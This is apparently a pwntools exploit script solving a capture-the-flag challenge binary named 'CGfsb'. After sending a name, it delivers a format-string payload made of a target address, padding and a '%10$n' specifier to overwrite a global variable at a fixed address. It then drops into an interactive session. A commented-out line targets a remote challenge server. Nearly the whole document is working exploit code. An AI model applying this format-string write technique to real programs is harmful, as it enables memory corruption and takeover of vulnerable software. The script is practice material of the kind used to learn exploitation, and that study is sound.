from pwn import *
# from LibcSearcher import *
p = process("./CGfsb")
#p = remote("111.198.29.45",53617)
context.terminal = ["tmux","splitw","-h"]
context.log_level = 'debug'
# context.terminal = ['tmux','splitw','-h']

# elf = ELF("./CGfsb")
# obj = LibcSearcher("",)
p.recvuntil("name")
p.sendline("asdf")
gdb.attach(p,"b *main+256")
pwnme_addr = 0x804A068
payload =p32(pwnme_addr) + "a"*4 + "%10$n"
p.sendlineafter("please",payload)

# p.sendline(payload)
p.interactive()
